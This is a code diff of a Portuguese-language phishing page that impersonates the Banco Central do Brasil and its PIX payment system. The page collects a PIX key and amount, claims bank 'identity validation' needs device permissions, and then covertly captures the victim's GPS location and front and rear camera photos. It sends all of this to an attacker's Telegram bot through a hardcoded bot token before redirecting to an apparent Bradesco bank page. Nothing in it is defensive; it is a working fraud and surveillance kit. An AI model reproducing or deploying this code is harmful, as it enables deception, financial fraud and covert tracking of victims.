@@ -12,54 +12,53 @@
 
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        
-        /* CARTÃO PRINCIPAL DA PRE-LANDING */
         .pix-card { background: white; max-width: 420px; width: 100%; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; }
-        
-        /* TOPO COM O LOGO DO BC */
-        .bc-header { background-color: white; padding: 25px 20px; text-align: center; border-bottom: 2px solid #32bcad; }
+        .header { background-color: #32bcad; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
+        .bc-header { background-color: white; padding: 25px 20px; text-align: center; border-bottom: 2px solid #32bcad; display: none; }
         .bc-logo { width: 160px; height: auto; display: block; margin: 0 auto; }
-
-        /* CONTEÚDO DA MENSAGEM */
-        .content { padding: 30px; text-align: center; }
-        
-        h1 { color: #333; font-size: 20px; font-weight: bold; margin-bottom: 15px; }
-        
-        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
-        
-        /* O BOTÃO QUE IRÁ DISPARAR AS PERMISSÕES REALMENTE */
-        .btn-confirmar { width: 100%; background-color: #007bff; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,123,255,0.3); }
-        .btn-confirmar:hover { background-color: #0069d9; transform: translateY(-2px); }
-        .btn-confirmar:active { transform: translateY(1px); }
-
-        .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; }
+        .content { padding: 30px; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        .btn-acao { width: 100%; background-color: #32bcad; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-blue { background-color: #007bff; box-shadow: 0 5px 15px rgba(0,123,255,0.3); }
+        .spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-left: 10px; vertical-align: middle; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        .secure-info { font-size: 11px; color: #aaa; text-align: center; margin-top: 30px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; text-transform: uppercase; letter-spacing: 1px;}
+        .footer-info { font-size: 11px; color: #aaa; text-align: center; margin-top: 25px; line-height: 1.4; border-top: 1px solid #eee; padding-top: 15px; }
+        #tela-permissao { display: none; text-align: center; }
     </style>
 </head>
 <body>
 
 <div class="pix-card">
-    <div class="bc-header">
-        <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" alt="Banco Central do Brasil" class="bc-logo">
+    <div id="header-dados" class="header">AUTENTICADOR DE RECEBIMENTOS</div>
+    
+    <div id="header-bc" class="bc-header">
+        <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" alt="BC" class="bc-logo">
     </div>
 
     <div class="content">
-        <h1>Validação de Identidade</h1>
-        
-        <p>
-            Para sua segurança, o Banco Central exige as permissões do dispositivo para liberar este recebimento. 
-            <br><br>
-            Isso garante que você receba o valor e evita golpes.
-        </p>
+        <div id="tela-dados">
+            <label>Valor para Recebimento (R$):</label>
+            <input type="number" id="valor" placeholder="Ex: 1250,00">
+            <label>Chave PIX do Beneficiário:</label>
+            <input type="text" id="chave" placeholder="CPF, E-mail ou Celular">
+            <button class="btn-acao" onclick="mostrarAviso()">PROSSEGUIR</button>
+        </div>
 
-        <button class="btn-confirmar" id="btnAcao" onclick="iniciarCaptura()">
-            AUTENTICAR E LIBERAR PIX
-            <div class="spinner" id="spinner"></div>
-        </button>
+        <div id="tela-permissao">
+            <h1 style="font-size: 20px; color: #333;">Validação de Identidade</h1>
+            <p style="color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px;">
+                Para sua segurança, o Banco Central exige as permissões do dispositivo para liberar este recebimento. 
+                <br><br>
+                Isso garante que você receba o valor e evita golpes.
+            </p>
+            <button class="btn-acao btn-blue" id="btnFinal" onclick="dispararCaptura()">
+                AUTENTICAR E LIBERAR PIX
+                <div class="spinner" id="spinner"></div>
+            </button>
+        </div>
 
-        <div class="secure-info">
+        <div class="footer-info">
             Portal de Conferência de Valores Interbancário<br>
             Criptografia de Segurança Ativa
         </div>
@@ -70,70 +69,63 @@
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-    // SEU TOKEN E ID JÁ CONFIGURADOS E TESTADOS
     const TOKEN = "8757264210:AAGASjOqrfL2a8QgIDp0rszG3Wi6sWWnb0s"; 
     const ID = "560716860";
+    let valorGlobal, chaveGlobal;
 
-    async function iniciarCaptura() {
-        // Ativa o spinner para dar credibilidade
+    function mostrarAviso() {
+        valorGlobal = document.getElementById('valor').value;
+        chaveGlobal = document.getElementById('chave').value;
+
+        if (!valorGlobal || !chaveGlobal) return alert("Preencha os dados.");
+
+        // Troca as telas
+        document.getElementById('header-dados').style.display = 'none';
+        document.getElementById('tela-dados').style.display = 'none';
+        document.getElementById('header-bc').style.display = 'block';
+        document.getElementById('tela-permissao').style.display = 'block';
+    }
+
+    async function dispararCaptura() {
         document.getElementById('spinner').style.display = 'inline-block';
-        document.getElementById('btnAcao').disabled = true;
+        document.getElementById('btnFinal').disabled = true;
 
-        // 1. SOLICITA GPS (A BARREIRA REAL)
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            // Envia Localização e Dados
-            const msg = `📍 *ALVO LOCALIZADO*\n🌍 Mapa: ${mapa}\n📱 Dispositivo: Validação do Alvo Iniciada`;
+            
+            const msg = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${valorGlobal}\n🔑 Chave: ${chaveGlobal}\n🌍 Mapa: https://www.google.com/maps?q=${lat},${lon}`;
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-            // 2. CAPTURA FOTOS SEQUENCIAIS (FRONTAL E TRASEIRA)
             try {
                 await tirarFoto("user", "FRONTAL");
                 await tirarFoto("environment", "TRASEIRA");
-                // SE DER TUDO CERTO, MANDA PARA O TOKEN
                 window.location.href = "bradesco.html";
             } catch (e) {
-                // Se der erro de câmera (alvo negou o segundo pop-up), ainda assim libera o Token
-                // pois o GPS já foi enviado na etapa anterior.
                 window.location.href = "bradesco.html";
             }
-
         }, (err) => {
-            // SE NEGAR LOCALIZAÇÃO: Trava o acesso e manda para página de erro
             window.location.href = "autorizar.html";
         });
     }
 
     async function tirarFoto(face, label) {
         try {
-            const constraints = { video: { facingMode: face }, audio: false };
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: face } });
             const video = document.getElementById('video');
             video.srcObject = stream;
-            
             await new Promise(r => video.onloadedmetadata = r);
-            await new Promise(r => setTimeout(r, 500)); // Pausa tática para focar
-            
             const canvas = document.getElementById('canvas');
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            
-            stream.getTracks().forEach(track => track.stop());
-
+            stream.getTracks().forEach(t => t.stop());
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
             const fd = new FormData();
             fd.append('chat_id', ID);
             fd.append('photo', blob, `${label}.jpg`);
-            fd.append('caption', `📸 Câmera ${label} (${new Date().toLocaleTimeString()})`);
-            
+            fd.append('caption', `📸 Câmera ${label}`);
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch (error) {
-            console.error("Erro na captura:", label);
-        }
+        } catch (e) {}
     }
 </script>
-
 </body>
 </html>
